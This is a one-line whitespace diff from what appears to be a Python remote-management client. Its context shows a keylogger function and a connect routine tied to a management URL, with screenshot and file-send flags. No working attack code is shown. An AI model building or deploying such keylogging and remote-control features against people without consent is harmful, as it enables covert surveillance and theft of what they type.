@@ -70,7 +70,6 @@ def enableKeylogger():
     with Listener(on_press=on_press) as listener:
         listener.join()
 
-
 def connect(url, managementURL):
     screenshotwarning = False
     sendfilewarning = False
